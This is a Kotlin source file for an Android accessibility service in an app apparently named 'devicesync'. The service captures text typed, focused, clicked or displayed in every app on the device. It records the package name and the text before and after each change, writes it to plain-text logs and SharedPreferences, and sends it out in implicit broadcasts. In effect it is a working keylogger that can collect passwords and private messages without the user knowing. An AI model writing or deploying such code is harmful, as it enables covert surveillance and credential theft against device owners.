package com.devicesync.app.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicesync.app.utils.DataCollector
import com.devicesync.app.utils.DeviceConfigManager
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class TextInputAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "TextInputAccessibility"
        private var isServiceEnabled = false
        
        fun isEnabled(): Boolean = isServiceEnabled
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isServiceEnabled = true
        Log.d(TAG, "✅ Text Input Accessibility Service connected")
        
        // Send service status to main app
        sendBroadcast(Intent("TEXT_INPUT_SERVICE_STATUS").apply {
            putExtra("enabled", true)
        })
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handleViewFocused(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClicked(event)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    handleWindowContentChanged(event)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}", e)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val changedText = event.text.joinToString("")
        val beforeText = event.beforeText?.toString() ?: ""
        val itemCount = event.itemCount
        val fromIndex = event.fromIndex
        val addedCount = event.addedCount
        val removedCount = event.removedCount
        
        val timestamp = System.currentTimeMillis()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault())
        val formattedTime = dateFormat.format(Date(timestamp))

        Log.d(TAG, "📝 Text Changed Event:")
        Log.d(TAG, "   Package: $packageName")
        Log.d(TAG, "   Class: $className")
        Log.d(TAG, "   Changed Text: '$changedText'")
        Log.d(TAG, "   Before Text: '$beforeText'")
        Log.d(TAG, "   Item Count: $itemCount")
        Log.d(TAG, "   From Index: $fromIndex")
        Log.d(TAG, "   Added Count: $addedCount")
        Log.d(TAG, "   Removed Count: $removedCount")
        Log.d(TAG, "   Timestamp: $formattedTime")

        // Create text input data object
        val textInputData = JSONObject().apply {
            put("event_type", "text_changed")
            put("package_name", packageName)
            put("class_name", className)
            put("changed_text", changedText)
            put("before_text", beforeText)
            put("item_count", itemCount)
            put("from_index", fromIndex)
            put("added_count", addedCount)
            put("removed_count", removedCount)
            put("timestamp", timestamp)
            put("formatted_time", formattedTime)
        }

        // Store text input data
        storeTextInputData(textInputData)
        
        // Send broadcast for real-time monitoring
        sendTextInputBroadcast("text_changed", textInputData)
    }

    private fun handleViewFocused(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val focusedText = event.text.joinToString("")
        val timestamp = System.currentTimeMillis()
        
        Log.d(TAG, "🎯 View Focused:")
        Log.d(TAG, "   Package: $packageName")
        Log.d(TAG, "   Class: $className")
        Log.d(TAG, "   Focused Text: '$focusedText'")

        val focusData = JSONObject().apply {
            put("event_type", "view_focused")
            put("package_name", packageName)
            put("class_name", className)
            put("focused_text", focusedText)
            put("timestamp", timestamp)
        }

        storeTextInputData(focusData)
        sendTextInputBroadcast("view_focused", focusData)
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val clickedText = event.text.joinToString("")
        val timestamp = System.currentTimeMillis()
        
        Log.d(TAG, "👆 View Clicked:")
        Log.d(TAG, "   Package: $packageName")
        Log.d(TAG, "   Class: $className")
        Log.d(TAG, "   Clicked Text: '$clickedText'")

        val clickData = JSONObject().apply {
            put("event_type", "view_clicked")
            put("package_name", packageName)
            put("class_name", className)
            put("clicked_text", clickedText)
            put("timestamp", timestamp)
        }

        storeTextInputData(clickData)
        sendTextInputBroadcast("view_clicked", clickData)
    }

    private fun handleWindowContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        val contentText = event.text.joinToString("")
        val timestamp = System.currentTimeMillis()
        
        Log.d(TAG, "🔄 Window Content Changed:")
        Log.d(TAG, "   Package: $packageName")
        Log.d(TAG, "   Class: $className")
        Log.d(TAG, "   Content: '$contentText'")

        val contentData = JSONObject().apply {
            put("event_type", "window_content_changed")
            put("package_name", packageName)
            put("class_name", className)
            put("content_text", contentText)
            put("timestamp", timestamp)
        }

        storeTextInputData(contentData)
        sendTextInputBroadcast("window_content_changed", contentData)
    }

    private fun storeTextInputData(data: JSONObject) {
        try {
            // Store in shared preferences for persistence
            val prefs = getSharedPreferences("text_input_data", MODE_PRIVATE)
            val key = "text_input_${System.currentTimeMillis()}"
            prefs.edit().putString(key, data.toString()).apply()
            
            // Keep only last 100 entries
            val allKeys = prefs.all.keys.filter { it.startsWith("text_input_") }.sorted()
            if (allKeys.size > 100) {
                val keysToRemove = allKeys.take(allKeys.size - 100)
                prefs.edit().apply {
                    keysToRemove.forEach { remove(it) }
                }.apply()
            }
            
            Log.d(TAG, "💾 Text input data stored: $key")
        } catch (e: Exception) {
            Log.e(TAG, "Error storing text input data: ${e.message}", e)
        }
    }

    private fun sendTextInputBroadcast(action: String, data: JSONObject) {
        try {
            val intent = Intent("TEXT_INPUT_EVENT").apply {
                putExtra("action", action)
                putExtra("data", data.toString())
                putExtra("timestamp", System.currentTimeMillis())
            }
            sendBroadcast(intent)
            Log.d(TAG, "📡 Text input broadcast sent: $action")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending text input broadcast: ${e.message}", e)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "⚠️ Text Input Accessibility Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceEnabled = false
        Log.d(TAG, "❌ Text Input Accessibility Service destroyed")
        
        // Send service status to main app
        sendBroadcast(Intent("TEXT_INPUT_SERVICE_STATUS").apply {
            putExtra("enabled", false)
        })
    }

    // Helper method to get all text input data
    fun getAllTextInputData(): List<JSONObject> {
        val prefs = getSharedPreferences("text_input_data", MODE_PRIVATE)
        return prefs.all.entries
            .filter { it.key.startsWith("text_input_") }
            .mapNotNull { 
                try {
                    JSONObject(it.value.toString())
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing text input data: ${e.message}")
                    null
                }
            }
            .sortedBy { it.optLong("timestamp", 0) }
    }

    // Helper method to clear all text input data
    fun clearAllTextInputData() {
        val prefs = getSharedPreferences("text_input_data", MODE_PRIVATE)
        val keysToRemove = prefs.all.keys.filter { it.startsWith("text_input_") }
        prefs.edit().apply {
            keysToRemove.forEach { remove(it) }
        }.apply()
        Log.d(TAG, "🗑️ All text input data cleared")
    }
} 